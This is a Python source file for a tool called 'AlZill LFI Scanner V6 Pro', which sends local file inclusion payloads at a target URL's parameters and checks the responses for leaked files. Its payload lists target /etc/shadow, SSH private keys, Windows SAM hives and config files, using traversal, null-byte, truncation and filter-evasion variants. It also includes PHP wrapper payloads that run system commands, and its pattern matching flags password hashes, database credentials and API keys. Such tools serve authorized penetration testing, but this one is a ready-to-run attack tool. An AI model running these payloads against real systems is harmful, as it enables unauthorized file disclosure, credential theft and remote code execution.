#!/usr/bin/env python3
# modules/lfi_scanner.py
# AlZill LFI Scanner V6 Pro - Advanced Local File Inclusion Scanner
# Features: Path Truncation, Null Byte Bypass, Base64 Smart Detection, External Payloads

import requests
import time
import urllib3
import re
import random
import base64
import os
from termcolor import cprint
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DEBUG = False

def log(msg, level="INFO"):
    if DEBUG:
        colors = {"INFO": "[*]", "SUCCESS": "[+]", "WARNING": "[!]", "ERROR": "[-]"}
        print(f"{colors.get(level, '[*]')} {msg}")


def generate_payloads(payloads_file="payloads.txt"):
    """Generate LFI payloads from external file + internal fallback"""
    payloads = []
    
    # Load external payloads from file
    external_payloads = _load_external_payloads(payloads_file)
    payloads.extend(external_payloads)
    
    # Also include internal payloads (always)
    internal_payloads = _generate_internal_payloads()
    payloads.extend(internal_payloads)
    
    return list(set(payloads))


def _load_external_payloads(payloads_file="payloads.txt") -> list:
    """Load LFI payloads from payloads.txt [LFI] section"""
    payloads = []
    
    if not os.path.exists(payloads_file):
        return payloads
    
    try:
        with open(payloads_file, 'r', encoding='utf-8') as f:
            content = f.read()
        
        current_section = None
        lfi_count = 0
        
        for line in content.split('\n'):
            line = line.strip()
            
            if not line or line.startswith('#'):
                continue
            
            if line.startswith('[') and line.endswith(']'):
                current_section = line[1:-1].upper()
                continue
            
            if current_section == 'LFI':
                payloads.append(line)
                lfi_count += 1
        
        if lfi_count > 0:
            cprint(f"\n[+] Loaded {lfi_count} LFI payloads from {payloads_file}", "green")
        
    except Exception as e:
        if DEBUG:
            cprint(f"[!] Error loading LFI payloads: {e}", "yellow")
    
    return payloads


def _generate_internal_payloads() -> list:
    """Generate internal LFI payloads (fallback)"""
    payloads = []
    
    linux_files = [
        "/etc/passwd", "/etc/shadow", "/etc/group", "/etc/hosts",
        "/etc/hostname", "/etc/issue", "/etc/os-release", "/etc/debian_version",
        "/etc/redhat-release", "/proc/self/environ", "/proc/self/cmdline",
        "/proc/self/status", "/proc/self/fd/0", "/proc/self/fd/1",
        "/var/log/apache2/access.log", "/var/log/apache2/error.log",
        "/var/log/nginx/access.log", "/var/log/nginx/error.log",
        "/var/log/auth.log", "/var/log/syslog", "/var/log/messages",
        "/var/log/mysql/error.log", "/home/*/.bash_history", "/root/.bash_history",
        "/root/.ssh/id_rsa", "/root/.ssh/authorized_keys", "/etc/ssh/sshd_config",
        "/etc/mysql/my.cnf", "/etc/nginx/nginx.conf", "/etc/apache2/apache2.conf",
        "/etc/php.ini", "/etc/php/php.ini", "/etc/php5/apache2/php.ini",
    ]
    
    traversal_levels = ["../../", "../../../", "../../../../", "../../../../../", 
                        "../../../../../../", "../../../../../../../"]
    
    for file in linux_files:
        for level in traversal_levels:
            payloads.append(f"{level}{file}")
            truncation = "/." * 2048
            payloads.append(f"{level}{file}{truncation}")
            payloads.append(f"{level}{file}{truncation}.php")
            payloads.append(f"{level}{file}%00")
            payloads.append(f"{level}{file}%00.php")
            payloads.append(f"{level}{file}%2500")
            payloads.append(f"%252e%252e%252f{file.replace('/', '%252f')}")
            payloads.append(f"....//....//....//{file}")
            payloads.append(f"..;/..;/..;/{file}")
            payloads.append(f"%2e%2e%2f%2e%2e%2f%2e%2e%2f{file}")
            payloads.append(f"php://filter/convert.base64-encode/resource={level}{file}")
            payloads.append(f"php://filter/read=convert.base64-encode/resource={level}{file}")
            payloads.append(f"php://filter/zlib.deflate/convert.base64-encode/resource={level}{file}")
    
    source_files = [
        "index", "config", "db", "database", "functions", "settings", "config.inc",
        "wp-config", "configuration", "constants", "bootstrap", "common", "global",
        "init", "main", "app", "core", "router", "controller", "model", "view"
    ]
    
    extensions = [".php", ".inc", ".txt", ".bak", ".old", ".swp", "~"]
    
    for src in source_files:
        for ext in extensions:
            payloads.append(f"../../{src}{ext}")
            payloads.append(f"../../../{src}{ext}")
            payloads.append(f"../../../../{src}{ext}")
            payloads.append(f"php://filter/convert.base64-encode/resource={src}{ext}")
            payloads.append(f"php://filter/read=convert.base64-encode/resource={src}{ext}")
            truncation = "/." * 2048
            payloads.append(f"../../{src}{ext}{truncation}")
    
    windows_files = [
        "C:\\Windows\\win.ini", "C:\\Windows\\system.ini",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "C:\\Windows\\System32\\config\\sam",
        "C:\\Windows\\System32\\config\\system",
        "C:\\boot.ini", "C:\\Windows\\repair\\sam",
        "C:\\Windows\\repair\\system", "C:\\Windows\\repair\\security",
        "C:\\xampp\\apache\\conf\\httpd.conf",
        "C:\\xampp\\php\\php.ini", "C:\\xampp\\mysql\\bin\\my.ini",
        "C:\\Program Files\\Apache Group\\Apache\\conf\\httpd.conf",
    ]
    
    for file in windows_files:
        for level in traversal_levels:
            payloads.append(f"{level}{file}")
            payloads.append(f"{level}{file}%00")
            cleaned_file = file.replace('C:\\', '')
            payloads.append(f"{level}{cleaned_file}")
    
    php_wrappers = [
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/read=convert.base64-encode/resource=config.php",
        "php://filter/string.rot13/resource=index.php",
        "php://filter/zlib.inflate/convert.base64-encode/resource=index.php",
        "php://input",
        "php://input/data:text/plain,<?php system('id'); ?>",
        "data://text/plain,<?php system('id'); ?>",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==",
        "expect://id",
        "expect://ls",
        "zip://index.zip#index.php",
        "phar://index.phar/index.php",
    ]
    payloads.extend(php_wrappers)
    
    waf_bypass = [
        "pHp://filter/convert.base64-encode/resource=index.php",
        "PHP://filter/convert.base64-encode/resource=index.php",
        "%70%68%70://filter/convert.base64-encode/resource=index.php",
        "php%3a//filter/convert.base64-encode/resource=index.php",
        "php ://filter/convert.base64-encode/resource=index.php",
        "php%09://filter/convert.base64-encode/resource=index.php",
        "php/*%0a*/://filter/convert.base64-encode/resource=index.php",
        "php://filter/convert.base64-encode|php://filter/convert.base64-encode/resource=index.php",
        "/etc/passwd%00.jpg",
        "/etc/passwd%00.gif",
        "../../../etc/passwd%00.jpg",
        "../../../etc/passwd%2500.jpg",
    ]
    payloads.extend(waf_bypass)
    
    return payloads


def smart_base64_decode(response_text):
    """التحقق الذكي من Base64 - فك التشفير والتأكد من وجود كود PHP"""
    base64_patterns = [
        r'[A-Za-z0-9+/]{100,}',
        r'[A-Za-z0-9+/]{40,}={0,2}',
        r'PD9waHA',
    ]
    
    for pattern in base64_patterns:
        matches = re.findall(pattern, response_text)
        for b64_str in matches:
            try:
                decoded = base64.b64decode(b64_str).decode('utf-8', errors='ignore')
                if '<?php' in decoded.lower() or 'namespace' in decoded.lower():
                    return True, decoded[:200]
                php_keywords = ['function', 'class', 'define', 'require_once', 
                               'include_once', '$this', 'public function', 'private function']
                for keyword in php_keywords:
                    if keyword in decoded.lower():
                        return True, decoded[:200]
            except Exception:
                continue
    
    return False, None


def confirm_lfi(response_text):
    """تأكيد الثغرة بدقة عالية - AlZill V6"""
    results = []
    
    classic_patterns = [
        (r'root:x:[0-9]+:[0-9]+:', '/etc/passwd (User list)'),
        (r'daemon:x:[0-9]+:[0-9]+:', '/etc/passwd (System users)'),
        (r'^[a-z_]+:x:[0-9]+:', '/etc/passwd format'),
        (r'^root:\$[0-9]\$', '/etc/shadow (Password hash)'),
        (r'127\.0\.0\.1\s+localhost', '/etc/hosts file'),
        (r'\[extensions\]', 'win.ini (Windows configuration)'),
        (r'\[fonts\]', 'win.ini (Fonts section)'),
        (r'\[boot loader\]', 'boot.ini (Windows boot)'),
        (r'<\?php', 'PHP source code (plain)'),
        (r'\$db_(host|name|user|pass|password)', 'Database credentials'),
        (r'(api[_-]?key|apikey|secret)[\s]*=[\s]*[\'"]?[a-zA-Z0-9_\-]{16,}', 'API Key detected'),
    ]
    
    for pattern, name in classic_patterns:
        if re.search(pattern, response_text, re.IGNORECASE | re.MULTILINE):
            lines = response_text.split('\n')
            for line in lines[:20]:
                if re.search(pattern, line, re.IGNORECASE):
                    results.append(f"{name}: {line[:100]}")
                    break
            else:
                results.append(name)
    
    is_base64, decoded_content = smart_base64_decode(response_text)
    if is_base64:
        results.append(f"PHP source code (Base64 encoded): {decoded_content[:150]}...")
    
    if re.search(r'PD9waHA', response_text):
        results.append("PHP source code (Base64 - <?php marker detected)")
        try:
            full_decoded = base64.b64decode(response_text.strip()).decode('utf-8', errors='ignore')
            if '<?php' in full_decoded:
                results.append(f"Full PHP source decoded: {full_decoded[:200]}...")
        except:
            pass
    
    if len(response_text) > 1000 and '<?php' in response_text.lower():
        results.append("PHP source code (long response with PHP tags)")
    
    if len(response_text) > 500 and 'function' in response_text.lower() and 'class' in response_text.lower():
        results.append("PHP class/function structure detected")
    
    if results:
        return " | ".join(results[:3])
    return None


def scan(url, verbose=False, delay=1.0, payloads_file="payloads.txt"):
    global DEBUG
    DEBUG = verbose
    
    cprint("\n" + "="*60, "cyan")
    cprint("[LFI SCAN] AlZill V6 Pro - External Payloads", "magenta", attrs=['bold'])
    cprint("="*60, "cyan")
    cprint("[*] Techniques: Path Traversal | Path Truncation | Null Byte", "yellow")
    cprint("[*] Wrappers: PHP Filter | PHP Input | Data Wrapper", "yellow")
    cprint("[*] Detection: Smart Base64 Decoding | Pattern Matching", "yellow")
    cprint(f"[*] Target: {url}", "cyan")
    cprint(f"[*] Payloads: External from {payloads_file}", "yellow")
    cprint("[*] This may take several minutes for thorough scanning...", "yellow")
    cprint("="*60, "cyan")
    
    confirmed = False
    exploited_data = None
    working_payload = None
    working_param = None
    
    payloads = generate_payloads(payloads_file)
    cprint(f"[*] Generated {len(payloads)} advanced payloads", "green")
    
    try:
        baseline_res = requests.get(url, timeout=10, verify=False)
        baseline_len = len(baseline_res.text)
        baseline_hash = hash(baseline_res.text[:500])
        log(f"Baseline length: {baseline_len}", "INFO")
    except Exception as e:
        log(f"Baseline failed: {e}", "ERROR")
        baseline_len = 0
        baseline_hash = 0
    
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)
    
    common_lfi_params = [
        "file", "page", "path", "include", "src", "lang", "doc", 
        "folder", "root", "load", "read", "data", "template",
        "view", "content", "action", "controller", "page_id",
        "cat", "category", "product", "id", "item", "document"
    ]
    
    if query_params:
        test_params = list(query_params.keys())
        log(f"Found {len(test_params)} parameters in URL", "INFO")
    else:
        test_params = common_lfi_params
        log(f"No parameters found, testing common LFI parameters", "WARNING")
    
    total_tests = len(test_params) * len(payloads)
    tested = 0
    
    for param in test_params:
        if confirmed:
            break
        
        cprint(f"\n[*] Testing parameter: {param}", "blue")
        
        for payload in payloads[:150]:
            tested += 1
            
            if tested % 50 == 0:
                cprint(f"    Progress: {tested}/{total_tests} payloads tested", "cyan")
            
            time.sleep(random.uniform(0.3, 0.8) * delay)
            
            current_query = query_params.copy() if query_params else {}
            current_query[param] = payload
            
            new_query = urlencode(current_query, doseq=True)
            test_url = urlunparse((parsed_url.scheme, parsed_url.netloc, parsed_url.path, 
                                  parsed_url.params, new_query, parsed_url.fragment))
            
            try:
                response = requests.get(test_url, timeout=10, verify=False)
                
                if response.status_code == 200:
                    content_hash = hash(response.text[:500])
                    content_diff = abs(len(response.text) - baseline_len)
                    
                    if content_diff > 200 or content_hash != baseline_hash:
                        extracted = confirm_lfi(response.text)
                        if extracted:
                            confirmed = True
                            exploited_data = extracted
                            working_payload = payload
                            working_param = param
                            break
                            
            except requests.exceptions.Timeout:
                log(f"Timeout on {param}: {payload[:50]}", "WARNING")
                continue
            except Exception as e:
                if DEBUG:
                    log(f"Error on {param}: {e}", "ERROR")
                continue
    
    cprint("\n" + "="*60, "cyan")
    
    if confirmed:
        cprint("⚠️  LFI VULNERABILITY CONFIRMED!", "red", attrs=['bold'])
        cprint("="*60, "red")
        cprint(f"[✓] Type: Local File Inclusion (LFI)", "light_red")
        cprint(f"[✓] Parameter: {working_param}", "yellow")
        cprint(f"[✓] Working Payload: {working_payload[:100]}...", "yellow")
        cprint(f"[✓] Extracted Content:", "green")
        cprint(f"    {exploited_data}", "white")
        cprint(f"[✓] Risk: CRITICAL - Sensitive file disclosure", "red")
        cprint(f"[✓] Impact: Attackers can read any file on the server", "red")
        cprint("="*60, "red")
        cprint("\n[!] RECOMMENDATION: Sanitize all file path inputs immediately!", "red")
        return True
    else:
        cprint("[✓] No LFI vulnerabilities found", "green")
        cprint("="*60, "green")
        return False


def scan_legacy(url, verbose=False):
    return scan(url, verbose)


if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        target = sys.argv[1]
        payloads_file = sys.argv[2] if len(sys.argv) > 2 else "payloads.txt"
        scan(target, verbose=True, payloads_file=payloads_file)
    else:
        print("Usage: python lfi_scanner.py <url> [payloads_file]")